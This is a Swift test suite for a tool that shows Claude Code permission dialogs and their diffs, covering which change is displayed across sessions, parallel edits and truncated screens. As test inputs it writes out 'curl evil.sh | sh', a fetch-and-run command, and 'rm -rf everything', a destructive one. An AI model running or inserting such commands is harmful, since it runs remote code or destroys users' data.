import Foundation
import Testing
@testable import GlanceCore

private func fixture(_ name: String) throws -> String {
  let url = URL(fileURLWithPath: #filePath).deletingLastPathComponent().deletingLastPathComponent()
    .deletingLastPathComponent().appendingPathComponent("Fixtures/prompts/\(name).txt")
  return try String(contentsOf: url, encoding: .utf8)
}

private let mine = "11111111-1111-1111-1111-111111111111"
private let theirs = "22222222-2222-2222-2222-222222222222"

private func transcript(_ id: String) -> String { "/Users/me/.claude/projects/-Users-me-app/\(id).jsonl" }

private func edit(old: String, new: String, file: String = "/Users/me/app/notes.txt") -> ToolCall {
  ToolCall(id: "toolu_1", name: "Edit", input: .object(["file_path": .string(file), "old_string": .string(old), "new_string": .string(new)]))
}

private func prompt(_ call: ToolCall, _ screen: DialogScreen, from file: String? = transcript(mine)) -> PendingPrompt {
  PendingPrompt(surface: "S", cwd: "/Users/me/app", call: call, screen: screen, created: .distantPast, transcript: file)
}

/// An Edit dialog in Claude Code's real layout (Fixtures/prompts/permission-edit.txt), its diff as long as asked.
private func editScreen(_ diff: [String]) throws -> DialogScreen {
  let rule = String(repeating: "─", count: 60), dash = String(repeating: "╌", count: 60)
  return try #require(PromptScreen.parse(([rule, " Edit file", " notes.txt", dash] + diff.map { " " + $0 }
    + [dash, " Do you want to make this edit to notes.txt?", " ❯ 1. Yes", "   2. No", "", " Esc to cancel · Tab to amend"]).joined(separator: "\n")))
}

@Suite struct PromptDetailTests {
  // MARK: The board shows the dialog itself

  @Test func parallelEditsInOneMessageCantShowADifferentChange() throws {
    // The book holds the newest Edit; the dialog is about the first. The second's words are a subset of what Yes approves.
    let screen = try editScreen(["1 -hello", "1 +goodbye", "2 +curl evil.sh | sh"])
    let call = edit(old: "hello", new: "goodbye")
    #expect(PromptDetail.onScreen(prompt(call, screen)) == .dialog(screen.detail))
    #expect(screen.detail.contains("2 +curl evil.sh | sh"))
  }

  @Test func aSameNamedFileInAnotherFolderCantShowADifferentChange() throws {
    let rule = String(repeating: "─", count: 60), dash = String(repeating: "╌", count: 60)
    let screen = try #require(PromptScreen.parse([rule, " Edit file", " src/b/index.ts", dash, " 1 -hello", " 1 +goodbye", dash,
                                                  " Do you want to make this edit to index.ts?", " ❯ 1. Yes", "   2. No", "",
                                                  " Esc to cancel · Tab to amend"].joined(separator: "\n")))
    let call = edit(old: "hello", new: "goodbye", file: "/a/index.ts")
    #expect(PromptDetail.onScreen(prompt(call, screen)) == .dialog(screen.detail))
    #expect(screen.detail.contains("src/b/index.ts"))
  }

  @Test func aDialogWithNothingOnItShowsNothing() throws {
    let bare = DialogScreen(question: "Proceed?", detail: [], options: [], selected: 0)
    #expect(PromptDetail.onScreen(prompt(edit(old: "a", new: "b"), bare)) == .none)
  }

  // MARK: Cut text says so

  @Test func aLongChangeThatFailsTheMatchSaysOnlyItsEndShows() throws {
    let lines = (1...30).map { "line \($0)" }
    let cut = try editScreen(lines.map { "+\($0)" })
    let call = edit(old: "x", new: (1...30).map { "other \($0)" }.joined(separator: "\n"))
    #expect(PromptDetail.showsOnlyTheEnd(prompt(call, cut), session: mine))
    // A subagent's long Edit always lands here, as its transcript names no session.
    let own = edit(old: "x", new: lines.joined(separator: "\n"))
    #expect(PromptDetail.showsOnlyTheEnd(prompt(own, cut, from: "/x/\(mine)/subagents/agent-1.jsonl"), session: mine))
    #expect(PromptDetail.showsOnlyTheEnd(prompt(own, cut), session: nil))
  }

  @Test func aLongCommandSaysOnlyItsEndShows() throws {
    let cut = try editScreen((1...30).map { "echo \($0)" })
    #expect(PromptDetail.showsOnlyTheEnd(prompt(ToolCall(id: "t", name: "Bash", input: .object([:])), cut), session: mine))
  }

  @Test func theWholeThingSaysNothing() throws {
    let whole = try #require(PromptScreen.parse(try fixture("permission-edit")))
    #expect(!PromptDetail.showsOnlyTheEnd(prompt(edit(old: "hello", new: "goodbye"), whole), session: mine))
    // Not the diff either way: the dialog shows all of it.
    #expect(!PromptDetail.showsOnlyTheEnd(prompt(edit(old: "hello", new: "farewell"), whole), session: mine))
    // The call's own diff shows all of it, whatever the screen kept.
    let lines = (1...30).map { "line \($0)" }
    let call = edit(old: lines.joined(separator: "\n"), new: lines.map { $0 + " changed" }.joined(separator: "\n"))
    let cut = try editScreen(lines.map { "-\($0)" } + lines.map { "+\($0) changed" })
    #expect(!PromptDetail.showsOnlyTheEnd(prompt(call, cut), session: mine))
    let empty = DialogScreen(question: "Proceed?", detail: [], options: [], selected: 0)
    #expect(!PromptDetail.showsOnlyTheEnd(prompt(ToolCall(id: "t", name: "WebFetch", input: .object([:])), empty), session: mine))
  }

  @Test func aLastLineOfABraceDoesntProveALongEdit() throws {
    // Two long Edits to one file: `}` is on almost any code screen.
    let code = (1...30).map { "  let value\($0) = \($0)" } + ["}"]
    let cut = try editScreen(code.map { "+\($0)" })
    #expect(!cut.detailIsWhole)
    let other = (1...30).map { "  other\($0)()" } + ["}"]
    let call = edit(old: "x", new: other.joined(separator: "\n"))
    #expect(PromptDetail.of(prompt(call, cut), session: mine) == .dialog(cut.detail))
  }

  @Test func theEndOfALongEditMustBeInOrder() throws {
    let tail = ["  let first = 1", "  let second = 2", "  let third = 3"]
    let cut = try editScreen((1...20).map { "+  noise \($0)" } + ["+\(tail[2])", "+\(tail[0])", "+\(tail[1])"])
    let call = edit(old: "x", new: tail.joined(separator: "\n"))
    #expect(PromptDetail.of(prompt(call, cut), session: mine) == .dialog(cut.detail))
  }

  @Test func thisSessionsEditShowsItsDiff() throws {
    let screen = try #require(PromptScreen.parse(try fixture("permission-edit")))
    let call = edit(old: "hello", new: "goodbye")
    #expect(PromptDetail.of(prompt(call, screen), session: mine) == .change(try #require(PromptChange(call: call))))
  }

  @Test func twoSessionsInOneFolderWithDifferentEditsShowOnlyTheDialogsOwnText() throws {
    // This split's dialog is my change; the book, going by folder, holds the other session's Edit of the same file.
    let screen = try #require(PromptScreen.parse(try fixture("permission-edit")))
    let other = edit(old: "hello", new: "rm -rf everything")
    #expect(PromptDetail.of(prompt(other, screen, from: transcript(theirs)), session: mine) == .dialog(screen.detail))
    // Even if the other session's diff happens to be the same text, it isn't known to be this session's.
    let same = edit(old: "hello", new: "goodbye")
    #expect(PromptDetail.of(prompt(same, screen, from: transcript(theirs)), session: mine) == .dialog(screen.detail))
  }

  @Test func aCallOfThisSessionThatIsntTheOneOnScreenShowsTheDialog() throws {
    // Two parallel calls in one session: the book takes the newest, the dialog may be about the other.
    let screen = try #require(PromptScreen.parse(try fixture("permission-edit")))
    #expect(PromptDetail.of(prompt(edit(old: "hello", new: "farewell"), screen), session: mine) == .dialog(screen.detail))
    #expect(PromptDetail.of(prompt(edit(old: "hello", new: "goodbye", file: "/Users/me/app/other.txt"), screen), session: mine) == .dialog(screen.detail))
  }

  @Test func anUnknownSessionShowsTheDialog() throws {
    let screen = try #require(PromptScreen.parse(try fixture("permission-edit")))
    let call = edit(old: "hello", new: "goodbye")
    // Not linked yet, or no transcript known, or a subagent's transcript: which session it is can't be told.
    #expect(PromptDetail.of(prompt(call, screen), session: nil) == .dialog(screen.detail))
    #expect(PromptDetail.of(prompt(call, screen, from: nil), session: mine) == .dialog(screen.detail))
    #expect(PromptDetail.of(prompt(call, screen, from: "/x/\(mine)/subagents/agent-1.jsonl"), session: mine) == .dialog(screen.detail))
  }

  @Test func aLongEditOfThisSessionKeepsItsWholeDiff() throws {
    // The screen's detail stops at its line limit, so only the end of the diff can be matched. The Glance view's
    // "Show all" needs the call's diff here, or every long edit would lose it.
    let lines = (1...30).map { "line \($0)" }
    let call = edit(old: lines.joined(separator: "\n"), new: lines.map { $0 + " changed" }.joined(separator: "\n"))
    let cut = try editScreen((lines.map { "-\($0)" } + lines.map { "+\($0) changed" }))
    #expect(!cut.detailIsWhole)
    #expect(PromptDetail.of(prompt(call, cut), session: mine) == .change(try #require(PromptChange(call: call))))
  }

  @Test func aLongEditWhoseEndIsntOnScreenShowsTheDialog() throws {
    let lines = (1...30).map { "line \($0)" }
    let cut = try editScreen(lines.map { "+\($0)" })
    #expect(!cut.detailIsWhole)
    let call = edit(old: "x", new: (1...30).map { "other \($0)" }.joined(separator: "\n"))
    #expect(PromptDetail.of(prompt(call, cut), session: mine) == .dialog(cut.detail))
  }

  @Test func aCommandAlwaysShowsTheDialogsOwnText() throws {
    let screen = try #require(PromptScreen.parse(try fixture("permission-bash")))
    let call = ToolCall(id: "t", name: "Bash", input: .object(["command": .string("something else")]))
    #expect(PromptDetail.of(prompt(call, screen), session: mine) == .dialog(screen.detail))
    #expect(PromptDetail.of(prompt(call, screen, from: nil), session: nil) == .dialog(screen.detail))
  }

  @Test func nothingToShowIsNothing() throws {
    let bare = DialogScreen(question: "Proceed?", detail: [], options: [], selected: 0)
    #expect(PromptDetail.of(prompt(ToolCall(id: "t", name: "WebFetch", input: .object([:])), bare), session: mine) == .none)
    // A diff that isn't established falls back to the dialog, and the dialog here has nothing.
    #expect(PromptDetail.of(prompt(edit(old: "a", new: "b"), bare), session: mine) == .none)
  }

  // MARK: A detail too tall for its box

  @Test func aDetailThatFitsNeedsNoCue() {
    #expect(PromptDetail.overflowCue(height: 80, limit: 180, lines: 4) == nil)
    #expect(PromptDetail.overflowCue(height: 180, limit: 180, lines: 9) == nil)
  }

  @Test func aDetailPastItsBoxSaysHowMuchThereIsAndWhatToDo() {
    #expect(PromptDetail.overflowCue(height: 181, limit: 180, lines: 12) == "12 lines. Scroll to see the end.")
    // One long line, wrapped by the card.
    #expect(PromptDetail.overflowCue(height: 400, limit: 180, lines: 1) == "Scroll to see the end.")
  }

  @Test func aHeightNotYetMeasuredCouldBeAnything() {
    #expect(PromptDetail.overflowCue(height: 0, limit: 180, lines: 12) != nil)
  }

  @Test func noDetailHasNothingToScrollTo() {
    // A question with no lines of its own is never measured: it has no view to measure.
    #expect(PromptDetail.overflowCue(height: 0, limit: 180, lines: 0) == nil)
  }
}
